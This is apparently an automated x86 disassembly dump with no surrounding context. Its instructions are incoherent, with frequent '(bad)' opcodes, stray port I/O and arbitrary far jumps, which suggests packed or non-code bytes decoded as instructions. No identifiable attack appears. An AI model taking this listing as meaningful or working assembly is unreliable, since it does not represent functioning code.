  41f2bc:	sub    BYTE PTR [edi-0x1c],al
  41f2bf:	retf   0x6dcb
  41f2c2:	jmp    0x41f244
  41f2c4:	leave  
  41f2c5:	xchg   BYTE PTR [ecx+esi*4+0x11c7f5cc],bh
  41f2cc:	xchg   ebx,eax
  41f2cd:	inc    ebx
  41f2ce:	push   esp
  41f2cf:	daa    
  41f2d0:	dec    eax
  41f2d1:	(bad)  
  41f2d2:	aam    0x51
  41f2d4:	lods   eax,DWORD PTR ds:[esi]
  41f2d5:	jne    0x41f343
  41f2d7:	mov    ds:0xe20c78c6,eax
  41f2dc:	pop    ecx
  41f2dd:	pinsrw mm0,edi,0x4a
  41f2e1:	imul   ebx,DWORD PTR [esi+0x37],0x23
  41f2e5:	in     eax,dx
  41f2e6:	ja     0x41f349
  41f2e8:	je     0x41f331
  41f2ea:	aas    
  41f2eb:	push   es
  41f2ec:	mov    dl,0x36
  41f2ee:	xchg   ecx,eax
  41f2ef:	arpl   WORD PTR [ecx-0x47],ax
  41f2f2:	jmp    0xb9a4:0xc2a019d3
  41f2f9:	pop    ss
  41f2fa:	xor    al,0xe6
  41f2fc:	cwde   
  41f2fd:	dec    ebx
  41f2fe:	shl    DWORD PTR ss:[ebx-0x5],1
  41f302:	cmp    DWORD PTR [edi+0x10],eax
  41f305:	or     BYTE PTR [esi],dl
  41f307:	sub    BYTE PTR [ebx-0x6],0x4
  41f30b:	test   al,0x62
  41f30d:	in     al,dx
  41f30e:	lds    ecx,FWORD PTR [esi-0x6e]
  41f311:	int3   
  41f312:	mov    eax,ds:0x45906c3b
  41f317:	cmp    ah,cl
  41f319:	ret    
  41f31a:	sar    DWORD PTR [edx],cl
  41f31c:	xor    eax,DWORD PTR [edx]
  41f31e:	mov    ds:0x9bdb5529,eax
  41f323:	jne    0x41f2d9
  41f325:	pop    eax
  41f326:	ds out 0x2c,al
  41f329:	sar    BYTE PTR [esi+eiz*2-0x76],1
  41f32d:	out    0x29,eax
  41f32f:	aam    0xa7
  41f331:	in     eax,dx
  41f332:	adc    ecx,0xffffffe1
  41f335:	adc    bl,BYTE PTR [esi]
  41f337:	push   ecx
  41f338:	mov    fs,WORD PTR [eax-0x66502952]
  41f33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f33f:	inc    eax
  41f340:	adc    edi,DWORD PTR [edx]
  41f342:	and    BYTE PTR ss:[eax],dl
  41f345:	in     eax,0x38
  41f347:	sbb    BYTE PTR [eax],al
  41f349:	sbb    al,0x37
  41f34b:	sub    BYTE PTR [ecx],dh
  41f34d:	out    dx,eax
  41f34e:	addr16 clc 
  41f350:	sbb    BYTE PTR [esp+edx*1-0x3469b945],ah
  41f357:	lods   al,BYTE PTR ds:[esi]
  41f358:	and    DWORD PTR ds:0x968929d9,esi
  41f35e:	sbb    eax,0xd5a56f80
  41f363:	(bad)  
  41f364:	aam    0x1c
  41f366:	sbb    DWORD PTR [ebx],ebx
  41f368:	shl    DWORD PTR ss:[eax-0x6aac406e],1
  41f36f:	mov    edi,0x70980de2
  41f374:	inc    ecx
  41f375:	sbb    ch,BYTE PTR [ebx]
  41f377:	xor    ch,BYTE PTR [ebp*4+0x53820927]
  41f37e:	outs   dx,BYTE PTR ds:[esi]
  41f37f:	or     bl,ah
  41f381:	and    eax,0x69227332
  41f386:	push   0x87f58347
  41f38b:	cmp    edx,edx
  41f38d:	call   0x956d4f34
  41f392:	dec    ebp
  41f393:	jge    0x41f3fe
  41f395:	int    0x9b
  41f397:	ret    
  41f398:	and    al,0x8c
  41f39a:	sbb    eax,0x167d31f
  41f39f:	push   eax
  41f3a0:	fsub   DWORD PTR [eax]
  41f3a2:	repnz mov ch,0x49
  41f3a5:	or     BYTE PTR [edx-0x3],0x91
  41f3a9:	sbb    ebp,DWORD PTR [esi]
  41f3ab:	sbb    edi,edi
  41f3ad:	mov    edi,0x7f65dfa9
  41f3b2:	mov    ecx,0x6191a02
  41f3b7:	ins    DWORD PTR es:[edi],dx
  41f3b8:	xlat   BYTE PTR ds:[ebx]
  41f3b9:	popf   
  41f3ba:	sub    al,0xcb
  41f3bc:	aaa    
  41f3bd:	sbb    eax,DWORD PTR [esi]
  41f3bf:	push   ds
  41f3c0:	xor    al,0xd3
  41f3c2:	outs   dx,BYTE PTR ds:[esi]
  41f3c3:	hlt    
  41f3c4:	adc    esp,ebx
  41f3c6:	pop    es
  41f3c7:	fadd   DWORD PTR ds:0x6eacd8bb
  41f3cd:	ds mov ch,0x40
  41f3d0:	popf   
  41f3d1:	aad    0x98
  41f3d3:	cmp    BYTE PTR [esi+esi*8-0x5],dh
  41f3d7:	fcmovnb st,st(2)
  41f3d9:	dec    esp
  41f3da:	pop    ss
  41f3db:	scas   eax,DWORD PTR es:[edi]
  41f3dc:	mov    ds:0xd4c5d360,eax
  41f3e1:	sbb    esi,esi
  41f3e3:	push   edi
  41f3e4:	mov    ds:0xdd1c4bd0,eax
  41f3e9:	or     ah,BYTE PTR [ebp+0x20ffe10c]
  41f3ef:	icebp  
  41f3f0:	mov    WORD PTR [edi+edx*1-0x799f2408],cs
  41f3f7:	out    dx,eax
  41f3f8:	xchg   edi,eax
  41f3f9:	mov    eax,ds:0x86ff5cfb
  41f3fe:	adc    ecx,0xffffff93
  41f401:	jbe    0x41f452
  41f403:	mov    esp,0xa24dbf9d
  41f408:	push   ebp
  41f409:	add    DWORD PTR [edx],0xfffffffa
  41f40c:	sub    eax,0x299a1d19
  41f411:	pop    eax
  41f412:	xchg   esp,ebx
  41f414:	stc    
  41f415:	jl     0x41f3b2
  41f417:	fdivr  st(3),st
  41f419:	add    eax,0x8e52f3ec
  41f41e:	int    0x19
  41f420:	push   edx
  41f421:	xor    esi,ecx
  41f423:	add    ecx,DWORD PTR [eax+0x70ac4a2a]
  41f429:	mov    dl,0x59
  41f42b:	cmp    dh,dl
  41f42d:	cmp    DWORD PTR [edi],edx
  41f42f:	xchg   BYTE PTR [ebx-0x3fee87e7],ah
  41f435:	in     eax,0xca
  41f437:	popa   
  41f438:	jb     0x41f490
  41f43a:	xor    eax,ecx
  41f43c:	retf   
  41f43d:	cmp    esi,eax
  41f43f:	jo     0x41f47f
  41f441:	inc    edi
  41f442:	sti    
  41f443:	push   edx
  41f444:	sub    DWORD PTR [esi],ebp
  41f446:	aaa    
  41f447:	sti    
  41f448:	sbb    DWORD PTR es:[eax],edx
  41f44b:	adc    DWORD PTR [esi-0x3669926b],eax
  41f451:	add    eax,0xb50a5470
  41f456:	in     eax,0xba
  41f458:	jg     0x41f481
  41f45a:	sub    al,0x2f
  41f45c:	pop    ebp
  41f45d:	and    ebp,edx
  41f45f:	xchg   esi,eax
  41f460:	fldenv [esi+0x479b41c2]
  41f466:	loop   0x41f423
  41f468:	xchg   ecx,eax
  41f469:	pop    es
  41f46a:	cmp    al,0xb0
  41f46c:	add    ah,bh
  41f46e:	mov    bh,0x78
  41f470:	xor    al,0xdf
  41f472:	aas    
  41f473:	mov    esp,0x5b298b64
  41f478:	aad    0xd0
  41f47a:	inc    ebx
  41f47b:	jge    0x41f4e0
  41f47d:	mov    bh,0x16
  41f47f:	call   0x4483dbe1
  41f484:	or     DWORD PTR [ebx+ebp*8+0x16a50509],edi
  41f48b:	push   ss
  41f48c:	jne    0x41f437
  41f48e:	mov    al,ds:0x1b1c2276
  41f493:	push   cs
  41f494:	jge    0x41f4e1
  41f496:	adc    bl,BYTE PTR [ebp+edx*4-0xa]
  41f49a:	icebp  
  41f49b:	cli    
  41f49c:	aaa    
  41f49d:	in     al,0xec
  41f49f:	xchg   esp,eax
  41f4a0:	jns    0x41f440
  41f4a2:	shl    BYTE PTR cs:[edi],cl
  41f4a5:	sbb    BYTE PTR [ebx],ah
  41f4a7:	or     eax,0x17dd657b
  41f4ac:	std    
  41f4ad:	mov    ds:0x40db523f,al
  41f4b2:	jge    0x41f481
  41f4b4:	jg     0x41f529
  41f4b6:	scas   al,BYTE PTR es:[edi]
  41f4b7:	loop   0x41f48d
  41f4b9:	cmp    eax,0x1bb79f70
  41f4be:	aam    0x60
  41f4c0:	push   ebp
  41f4c1:	test   eax,0x3d836bca
  41f4c6:	sahf   
  41f4c7:	cmp    eax,0x798595
  41f4cc:	dec    ecx
  41f4cd:	inc    edx
  41f4ce:	retf   0x941d
  41f4d1:	ja     0x41f50f
  41f4d3:	nop
  41f4d4:	dec    esp
  41f4d5:	inc    esp
  41f4d6:	jle    0x41f4dc
  41f4d8:	jl     0x41f4d0
  41f4da:	(bad)  
  41f4db:	hlt    
  41f4dc:	inc    ebp
  41f4dd:	pop    es
  41f4de:	jnp    0x41f514
  41f4e0:	(bad)  
  41f4e1:	pop    eax
  41f4e2:	je     0x41f525
  41f4e4:	mov    ds:0xe58538fe,eax
  41f4ea:	xchg   ebx,eax
  41f4eb:	push   ebp
  41f4ec:	mov    cl,0x6e
  41f4ee:	sbb    DWORD PTR [edx+0x37f163ed],edi
  41f4f4:	int    0x66
  41f4f6:	(bad)  
  41f4f7:	mov    esi,edx
  41f4f9:	dec    edx
  41f4fa:	mov    dl,0x55
  41f4fc:	out    0x91,eax
  41f4fe:	adc    edi,DWORD PTR [edx+0x3f0b59a9]
  41f504:	mov    al,BYTE PTR [edx+0x529a5774]
  41f50a:	mov    esi,0xf35e9813
  41f50f:	ja     0x41f562
  41f511:	mov    ds:0x4e12cac7,al
  41f516:	add    al,0xc
  41f518:	add    BYTE PTR [edi],dh
  41f51a:	mov    ch,0xeb
  41f51c:	hlt    
  41f51d:	test   DWORD PTR ds:0x3f9b097c,0x6d5f7baa
  41f527:	das    
  41f528:	mov    ecx,0x7ebfb200
  41f52d:	or     BYTE PTR [ecx+edx*1+0x74696d2d],0x15
  41f535:	jbe    0x41f538
  41f537:	and    bl,BYTE PTR [edx]
  41f539:	(bad)  
  41f53a:	push   0x6f21ee8a
  41f53f:	ins    DWORD PTR es:[edi],dx
  41f540:	mov    dl,0xcf
  41f542:	jg     0x41f577
  41f544:	pop    ss
  41f545:	xchg   ecx,eax
  41f546:	call   0xd8fb:0x3f19fc44
  41f54d:	enter  0x8e45,0x92
  41f551:	mov    cl,al
  41f553:	xor    BYTE PTR [ebx],dl
  41f555:	jmp    0x457d3379
  41f55a:	lock xor ecx,esi
  41f55d:	jp     0x41f4e9
  41f55f:	xor    eax,0xfe9116ed
  41f564:	leave  
  41f565:	mov    al,0xe8
  41f567:	sub    eax,0xca752a02
  41f56c:	fiadd  DWORD PTR ds:0x44dd4b37
  41f572:	(bad)
  41f575:	repnz inc eax
  41f577:	mov    DWORD PTR [ebx-0x613faa4d],ecx
  41f57d:	push   0x20
  41f57f:	jl     0x41f5d8
  41f581:	add    DWORD PTR [edx+0x68f1ab64],ecx
  41f587:	pop    DWORD PTR [ecx+0x311d475]
  41f58d:	push   ebx
  41f58e:	test   DWORD PTR [eax+0x16],esi
  41f591:	sbb    DWORD PTR [ecx+0x5dbcd75d],edi
  41f597:	mov    bh,0x7d
  41f599:	not    BYTE PTR [edx+ebp*2+0x42a11e0c]
  41f5a0:	sub    al,0x4b
  41f5a2:	(bad)  
  41f5a4:	mov    esp,0xbb785439
  41f5a9:	sti    
  41f5aa:	sbb    DWORD PTR [ebx+0x33],edi
  41f5ad:	js     0x41f5bd
  41f5af:	out    dx,al
  41f5b0:	jae    0x41f629
  41f5b2:	mov    al,ds:0x2bdbe586
  41f5b7:	std    
  41f5b8:	sub    dh,bh
  41f5ba:	fistp  QWORD PTR [edi-0x52ae6bb4]
  41f5c0:	jne    0x41f554
  41f5c2:	xchg   edx,eax
  41f5c3:	dec    ebp
  41f5c4:	or     ebx,DWORD PTR [ecx]
  41f5c6:	ins    BYTE PTR es:[edi],dx
  41f5c7:	and    BYTE PTR [ebx+eax*8+0x1d60083a],bh
  41f5ce:	fwait
  41f5cf:	jp     0x41f5dd
  41f5d1:	test   al,0xe4
  41f5d3:	mov    eax,ds:0x6738d6fe
  41f5d8:	mov    ebx,0x53940059
  41f5dd:	idiv   DWORD PTR [edi+0x69]
  41f5e0:	mov    ds:0x3ef9b628,eax
  41f5e5:	in     al,dx
  41f5e6:	jae    0x41f5fb
  41f5e8:	dec    ebp
  41f5e9:	repz sub cl,bl
  41f5ec:	call   0x5472c3f0
  41f5f1:	loope  0x41f59c
  41f5f3:	and    ebp,DWORD PTR [edi]
  41f5f5:	jle    0x41f57b
  41f5f7:	aam    0x15
  41f5f9:	fwait
  41f5fa:	call   0x43af2d9
  41f5ff:	cli    
  41f600:	cmp    dh,al
  41f602:	and    eax,0x4eae1448
  41f607:	dec    eax
  41f608:	(bad)  
  41f609:	mov    edx,0xaf9cbf59
  41f60e:	rol    dl,cl
  41f610:	and    eax,0x2fc6f6ce
  41f615:	push   ecx
  41f616:	xchg   BYTE PTR cs:[esi+eiz*2+0x5b],ah
  41f61b:	into   
  41f61c:	or     eax,0xd3ee5c87
  41f621:	adc    edi,0xcb06fa84
  41f627:	push   ebp
  41f628:	push   es
  41f629:	jecxz  0x41f66c
  41f62b:	adc    eax,0xe4835b00
  41f630:	or     eax,ebp
  41f632:	mov    edx,0xb2aebe4f
  41f637:	adc    DWORD PTR [edx],0xf21acdba
  41f63d:	or     BYTE PTR [ebp+0x6555d978],cl
  41f643:	ss mov esp,0x8a4e9b0b
  41f649:	xlat   BYTE PTR ds:[ebx]
  41f64a:	pop    esi
  41f64b:	arpl   WORD PTR [esi],bx
  41f64d:	adc    cl,cl
  41f64f:	mov    edi,0x1545583f
  41f654:	push   ebx
  41f655:	scas   al,BYTE PTR es:[edi]
  41f656:	and    ebp,edx
  41f658:	imul   edx,edi,0x4f
  41f65b:	cmp    al,0x4d
  41f65d:	stos   BYTE PTR es:[edi],al
  41f65e:	add    cl,bl
  41f660:	push   cs
  41f661:	mov    BYTE PTR [edi+0x17a8c404],bl
  41f667:	addr16 sbb al,0x60
  41f66a:	pop    es
  41f66b:	jl     0xbc511f48
  41f671:	jge    0x41f654
  41f673:	pushw  es
  41f675:	jmp    0xd7bd:0x396ada3c
  41f67c:	xchg   edi,eax
  41f67d:	in     al,dx
  41f67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f67f:	repnz add al,0xa1
  41f682:	cs dec ebp
  41f684:	add    ebp,DWORD PTR [edx+eiz*8+0x51]
  41f688:	inc    edi
  41f689:	sbb    dh,dl
  41f68b:	shl    DWORD PTR [ebp+0x79],0x58
  41f68f:	lods   al,BYTE PTR ds:[esi]
  41f690:	xor    eax,0xba2ff0ad
  41f695:	push   eax
  41f696:	mov    eax,0xeb6e4dd3
  41f69b:	xchg   ebx,eax
  41f69c:	rcr    DWORD PTR [edi-0x77],0x7
  41f6a0:	iret   
  41f6a1:	xor    al,BYTE PTR [ebp+0x5281ec8b]
  41f6a7:	dec    esp
  41f6a8:	outs   dx,BYTE PTR ds:[esi]
  41f6a9:	aaa    
  41f6aa:	push   ss
  41f6ab:	xchg   esi,eax
  41f6ac:	popf   
  41f6ad:	inc    ebx
  41f6ae:	mov    DWORD PTR [ecx-0x76],ebx
  41f6b1:	mov    ebx,0x532703a
  41f6b6:	mov    edx,0xaeb8759d
  41f6bb:	pop    ss
  41f6bc:	push   ecx
  41f6bd:	xchg   ebp,eax
  41f6be:	inc    edx
  41f6bf:	pop    ss
  41f6c0:	dec    eax
  41f6c1:	retf   0x9fce
  41f6c4:	adc    eax,0x184f6069
  41f6c9:	inc    esi
  41f6ca:	(bad)  
  41f6cb:	int3   
  41f6cc:	rol    BYTE PTR [ebp+0x7bcd7782],cl
  41f6d2:	xchg   DWORD PTR [ebx],eax
  41f6d4:	mov    ds:0xee8f88c5,eax
  41f6d9:	push   0x21
  41f6db:	sub    dh,BYTE PTR [edx]
  41f6dd:	pop    esp
  41f6de:	mov    edx,0xf7872f43
  41f6e3:	add    BYTE PTR [edx],ah
  41f6e5:	dec    esi
  41f6e6:	mov    ds:0x11594c02,al
  41f6eb:	mov    dh,0x7c
  41f6ed:	lods   al,BYTE PTR ds:[esi]
  41f6ee:	clc    
  41f6ef:	inc    BYTE PTR [eax+eiz*4+0x48f7c51d]
  41f6f6:	dec    edi
  41f6f7:	push   es
  41f6f8:	or     esp,DWORD PTR [esi+0x3f]
  41f6fb:	dec    ebx
  41f6fc:	inc    ebp
  41f6fd:	cmp    DWORD PTR [esi+0x6faf334b],edi
  41f703:	adc    al,0xf6
  41f705:	mov    esi,0x7ef2859c
  41f70a:	cmp    DWORD PTR [ebp+0x539b8cfe],ebp
  41f710:	jl     0x41f6ba
  41f712:	fucomi st,st(5)
  41f714:	fnstcw WORD PTR [ebp-0x7aef4730]
  41f71a:	dec    esp
  41f71b:	into   
  41f71c:	mov    al,0x39
  41f71e:	jg     0x41f6fb
  41f720:	sar    DWORD PTR es:[eiz*2-0x4bfc3b4],cl
  41f728:	jns    0x41f791
  41f72a:	push   ecx
  41f72b:	add    DWORD PTR [edi-0x1e14fd30],esp
  41f731:	pop    ecx
  41f732:	icebp  
  41f733:	jle    0x41f722
  41f735:	and    ebp,DWORD PTR [ecx+0x1703893b]
  41f73b:	add    DWORD PTR [eax+0x6b],ebp
  41f73e:	inc    esp
  41f73f:	mov    dh,0x1a
  41f741:	push   esi
  41f742:	fdivr  QWORD PTR [ecx+0x70c5b0f0]
  41f748:	inc    ebp
  41f749:	add    edi,DWORD PTR [edx]
  41f74b:	jl     0x41f6d1
  41f74d:	aas    
  41f74e:	cs xor eax,0xae86d52c
  41f754:	retf   0x79da
  41f757:	xor    eax,DWORD PTR [edi]
  41f759:	mov    ebp,0xc19c8451
  41f75e:	jnp    0x41f759
  41f760:	js     0x41f7b9
  41f762:	add    al,0x72
  41f764:	cli    
  41f765:	test   BYTE PTR [edx+0x501285dd],ah
  41f76b:	jecxz  0x41f75b
  41f76d:	xchg   DWORD PTR [esi-0x29],ebx
  41f770:	icebp  
  41f771:	xchg   ebp,eax
  41f772:	and    BYTE PTR [ebp-0x55],0x6b
  41f776:	mov    edi,0xc9af5a52
  41f77b:	mov    eax,ds:0xf1b76635
  41f780:	xchg   esi,eax
  41f781:	push   0x30
  41f783:	fisttp QWORD PTR [ecx-0x1f48f84f]
  41f789:	xor    ebx,esp
  41f78b:	xchg   DWORD PTR [esp+ebp*8+0x40023ce],edx
  41f792:	fs and al,0xb6
  41f795:	call   0x3c98de8e
  41f79a:	daa    
  41f79b:	in     al,dx
  41f79c:	jp     0x41f747
  41f79e:	sub    DWORD PTR [edx-0x48],ebp
  41f7a1:	mov    bl,0x7a
  41f7a3:	jb     0x41f7b4
  41f7a5:	pop    ebx
  41f7a6:	push   cs
  41f7a7:	sbb    eax,0x92d65c90
  41f7ac:	sbb    ah,ch
  41f7ae:	push   es
  41f7af:	dec    ebp
  41f7b0:	inc    edi
  41f7b1:	aad    0xcb
  41f7b3:	sub    edx,DWORD PTR [ebp+0x75dc78e1]
  41f7b9:	scas   al,BYTE PTR es:[edi]
  41f7ba:	xchg   ebx,eax
  41f7bb:	sub    eax,0xe6e80331
  41f7c0:	rcr    BYTE PTR [ecx+eax*1-0x2f],1
  41f7c4:	mov    bl,BYTE PTR [ecx]
  41f7c6:	xor    eax,0x8b46f0c8
  41f7cb:	shl    BYTE PTR [ebp+0x7b238561],0xe7
  41f7d2:	add    ebp,eax
  41f7d4:	in     al,dx
  41f7d5:	xlat   BYTE PTR ds:[ebx]
  41f7d6:	xor    esi,DWORD PTR [eax+edi*2]
  41f7d9:	cmp    ebp,esi
  41f7db:	jmp    0x72a0:0x395b41f0
  41f7e2:	je     0x41f7b9
  41f7e4:	jecxz  0x41f7f6
  41f7e6:	retf   
  41f7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7e8:	loop   0x41f7da
  41f7ea:	pop    esi
  41f7eb:	loop   0x41f83f
  41f7ed:	icebp  
  41f7ee:	pop    esp
  41f7ef:	and    edx,DWORD PTR [ebx+0x1c]
  41f7f2:	mov    fs,WORD PTR [ebp+0x1f]
  41f7f5:	xchg   ebx,eax
  41f7f6:	add    DWORD PTR [eax],ebp
  41f7f8:	rep ins BYTE PTR es:[edi],dx
  41f7fa:	je     0x41f790
  41f7fc:	ja     0x41f7bd
  41f7fe:	repz scas al,BYTE PTR es:[edi]
  41f800:	sub    al,BYTE PTR [ecx]
  41f802:	adc    al,bh
  41f804:	adc    dl,BYTE PTR [esi+0x2a1c2ca7]
  41f80a:	cld    
  41f80b:	fdivp  st(4),st
  41f80d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f80e:	dec    edi
  41f80f:	sub    BYTE PTR [ebp+0xc3cc0f8],bh
  41f815:	cwde   
  41f816:	pop    esp
  41f817:	ja     0x41f7de
  41f819:	jo     0x41f87b
  41f81b:	fisttp DWORD PTR [ebx-0x4]
  41f81e:	push   cs
  41f81f:	outs   dx,BYTE PTR ds:[esi]
  41f820:	mov    DWORD PTR [ebx-0x6b1a9539],esp
  41f826:	mov    dl,0x3c
  41f828:	add    DWORD PTR [ebx+0x5a],0x25
  41f82c:	sahf   
  41f82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f82e:	(bad)  
  41f82f:	int3   
  41f830:	inc    edi
  41f831:	cmc    
  41f832:	sbb    DWORD PTR [ecx-0x356fa09],0xd48a4753
  41f83c:	sub    al,0x77
  41f83e:	and    al,0x8e
  41f840:	jns    0x41f8ac
  41f842:	adc    DWORD PTR [edi+0x36303a16],esi
  41f848:	fsub   QWORD PTR [eax]
  41f84a:	test   eax,0x78ab9a97
  41f84f:	sub    DWORD PTR fs:[ecx+ecx*2+0x78],eax
  41f854:	push   esi
  41f855:	inc    edi
  41f856:	add    DWORD PTR [edi],esp
  41f858:	jle    0x41f7f3
  41f85a:	dec    DWORD PTR ds:0x572f2314
  41f860:	pusha  
  41f861:	lds    ebx,FWORD PTR [eax+esi*4-0x2d]
  41f865:	lahf   
  41f866:	data16 fcom DWORD PTR [eax+0x6f820949]
  41f86d:	addr16 push esp
  41f86f:	std    
  41f870:	xchg   ecx,eax
  41f871:	stos   DWORD PTR es:[edi],eax
  41f872:	adc    eax,0xa9d73f89
  41f877:	or     eax,0x20a11000
  41f87c:	push   eax
  41f87d:	jb     0x41f856
  41f87f:	nop
  41f880:	cwde   
  41f881:	add    bl,BYTE PTR [edi]
  41f883:	mov    bl,0xf9
  41f885:	mov    al,0x77
  41f887:	outs   dx,DWORD PTR ds:[esi]
  41f888:	adc    al,0xed
  41f88a:	mov    es,WORD PTR [eax-0x4502b4df]
  41f890:	dec    esp
  41f891:	jg     0x41f81e
  41f893:	push   esi
  41f894:	and    eax,0xe91e24cb
  41f899:	dec    eax
  41f89a:	sbb    eax,0x70764a42
  41f89f:	idiv   DWORD PTR [eax+ebp*1-0x6d7aa6f]
  41f8a6:	or     eax,0xec9bc067
  41f8ab:	(bad)  
  41f8ac:	and    esi,esp
  41f8ae:	fcom   DWORD PTR [edi-0x7db5c5a4]
  41f8b4:	xchg   esp,eax
  41f8b5:	shl    DWORD PTR [edx-0x54],cl
  41f8b8:	pop    ebx
  41f8b9:	mov    DWORD PTR [ebp+0x2e2c9901],edx
  41f8bf:	or     edi,DWORD PTR ds:0x44f2cf03
  41f8c5:	scas   al,BYTE PTR es:[edi]
  41f8c6:	adc    al,0xd3
  41f8c8:	out    0xf5,eax
  41f8ca:	clc    
  41f8cb:	mov    DWORD PTR [edx-0x8],ecx
  41f8ce:	sbb    eax,0x57e0aca3
  41f8d3:	loope  0x41f8b7
  41f8d5:	jns    0x41f914
  41f8d7:	mov    dh,0xf8
  41f8d9:	sar    BYTE PTR [ebx+0xa6f4bb],0x7d
  41f8e0:	lock mov DWORD PTR [ecx-0xa],0xf3d7517d
  41f8e8:	ja     0x41f8eb
  41f8ea:	jmp    FWORD PTR [ebp-0x69016c01]
  41f8f0:	cmp    bl,BYTE PTR ds:0xb7e9476e
  41f8f6:	mov    eax,0x65fe3481
  41f8fb:	cmp    ch,BYTE PTR [eax-0x28]
  41f8fe:	xor    esp,DWORD PTR [ecx+0x29fc1169]
  41f904:	or     al,0x55
  41f906:	mov    cl,0x66
  41f908:	xchg   ecx,eax
  41f909:	lahf   
  41f90a:	lds    ebp,FWORD PTR [edi]
  41f90c:	fisttp QWORD PTR [ebx+edx*4-0x60baa57b]
  41f913:	sub    dl,bh
  41f915:	push   ss
  41f916:	mov    edi,0x770017cc
  41f91b:	test   BYTE PTR [edi+0x3e],bh
  41f91e:	dec    ebp
  41f91f:	ret    0x96dd
  41f922:	jbe    0x41f8db
  41f924:	mov    eax,DWORD PTR [ebx]
  41f926:	aaa    
  41f927:	xor    cl,BYTE PTR [ebx]
  41f929:	mov    eax,ebp
  41f92b:	dec    ebp
  41f92c:	sbb    eax,0xc32ce80e
  41f931:	mov    WORD PTR [ecx+0x1d0ca656],ds
  41f937:	inc    esp
  41f938:	dec    eax
  41f939:	aam    0xf
  41f93b:	sub    al,0x9a
  41f93d:	ror    DWORD PTR [ebx-0x4c37eb9e],cl
  41f943:	lods   eax,DWORD PTR ds:[esi]
  41f944:	stos   BYTE PTR es:[edi],al
  41f945:	ds pop eax
  41f947:	cmp    eax,0x6805b025
  41f94c:	adc    edx,DWORD PTR [ebx]
  41f94e:	ins    DWORD PTR es:[edi],dx
  41f94f:	sar    DWORD PTR [ecx-0x1bb3fe0c],1
  41f955:	repz loop 0x41f916
  41f958:	inc    eax
  41f959:	push   ebp
  41f95a:	cmp    al,0xa
  41f95c:	pop    esp
  41f95d:	and    al,BYTE PTR ds:[esi+0x782f7568]
  41f964:	aaa    
  41f965:	jbe    0x41f994
  41f967:	cmp    eax,0x52d5784a
  41f96c:	and    BYTE PTR [ebx+0x633ac122],0x44
  41f973:	popa   
  41f974:	fidiv  DWORD PTR [ecx-0x5e719231]
  41f97a:	add    BYTE PTR ss:[ecx+0x35],al
  41f97e:	xor    edx,ecx
  41f980:	test   eax,0xee29bc2a
  41f985:	sub    BYTE PTR [edx-0x6a],ch
  41f988:	lahf   
  41f989:	xor    esi,DWORD PTR [edx]
  41f98b:	mov    esi,0xe586cf4e
  41f990:	or     cl,BYTE PTR [edi]
  41f992:	arpl   WORD PTR [edi-0x59],bp
  41f995:	call   0x9213:0xb9936b1d
  41f99c:	mov    ebp,0x3c978a1b
  41f9a1:	xchg   ecx,eax
  41f9a2:	sar    DWORD PTR [ebx],cl
  41f9a4:	xor    BYTE PTR [ebp+0x39],0xda
  41f9a8:	sbb    BYTE PTR [edi+0x79],bh
  41f9ab:	test   BYTE PTR [edx-0x95061c8],dl
  41f9b1:	and    DWORD PTR [esi+0x3f],0x7
  41f9b5:	adc    edx,esp
  41f9b7:	in     al,0x37
  41f9b9:	cs mov bh,cl
  41f9bc:	mov    dh,0x59
  41f9be:	imul   ecx,DWORD PTR [edx+0x3f975afc],0x32d017df
  41f9c8:	dec    ecx
  41f9c9:	dec    eax
  41f9ca:	cmp    BYTE PTR [ebp-0x21741ca7],0x27
  41f9d1:	sub    DWORD PTR fs:[ebp-0x1265775a],esi
  41f9d8:	aas    
  41f9d9:	mov    DWORD PTR [edx-0x3240fb4d],0x4ba28e42
  41f9e3:	lahf   
  41f9e4:	and    al,0x88
  41f9e6:	mov    DWORD PTR [esi+0x27],esp
  41f9e9:	fisttp WORD PTR [eax]
  41f9eb:	push   ds
  41f9ec:	cs jecxz 0x41f9de
  41f9ef:	inc    edx
  41f9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9f1:	es pushf 
  41f9f3:	retf   
  41f9f4:	in     al,dx
  41f9f5:	repnz mov ebx,0x776aa517
  41f9fb:	push   edx
  41f9fc:	dec    eax
  41f9fd:	sub    bh,dh
  41f9ff:	add    ecx,0x46
  41fa02:	ret    
  41fa03:	ret    
  41fa04:	rol    ecx,1
  41fa06:	jno    0x41f9de
  41fa08:	test   DWORD PTR [ebx+0x42],eax
  41fa0b:	mov    dh,0x49
  41fa0d:	pop    ebp
  41fa0e:	mov    ds:0x88aff674,al
  41fa13:	mov    ebx,0x5ec64191
  41fa18:	jmp    0x41fa34
  41fa1a:	mov    ebx,0x33319e3f
  41fa1f:	or     dl,dh
  41fa21:	hlt    
  41fa22:	jmp    esp
  41fa24:	and    dl,BYTE PTR ds:0x391929a9
  41fa2a:	add    al,BYTE PTR [ebp+0x52]
  41fa2d:	aas    
  41fa2e:	add    eax,0xa31f5f6f
  41fa33:	dec    ebp
  41fa34:	ficom  DWORD PTR gs:[esi]
  41fa37:	push   0x1e
  41fa39:	stos   DWORD PTR es:[edi],eax
  41fa3a:	mov    cl,0x29
  41fa3c:	fdiv   DWORD PTR [ebx-0x2915093]
  41fa42:	pop    edi
  41fa43:	gs repz mov cl,0xf8
  41fa47:	add    al,0x5b
  41fa49:	popa   
  41fa4a:	xchg   DWORD PTR [ebx-0x16],edx
  41fa4d:	inc    ebx
  41fa4e:	rcr    DWORD PTR [ebx-0x47],0x30
  41fa52:	ins    DWORD PTR es:[edi],dx
  41fa53:	clc    
  41fa54:	jp     0x41fad2
  41fa56:	stos   BYTE PTR es:[edi],al
  41fa57:	jge    0x41fa7f
  41fa59:	inc    ebp
  41fa5a:	and    esp,ebp
  41fa5c:	or     DWORD PTR [esi+esi*1],esi
  41fa5f:	pop    ecx
  41fa60:	pushf  
  41fa61:	mov    ebx,0xe05a3b28
  41fa66:	ss xchg edx,eax
  41fa68:	aam    0x12
  41fa6a:	mov    ebp,edx
  41fa6c:	rcr    esi,cl
  41fa6e:	adc    DWORD PTR [edx-0x338af8dd],0x92634b9
  41fa78:	arpl   WORD PTR [ebp-0x51],si
  41fa7b:	loopne 0x41fa29
  41fa7d:	mov    ch,0xaa
  41fa7f:	pop    esi
  41fa80:	in     al,dx
  41fa81:	xchg   edx,eax
  41fa82:	out    0x4d,eax
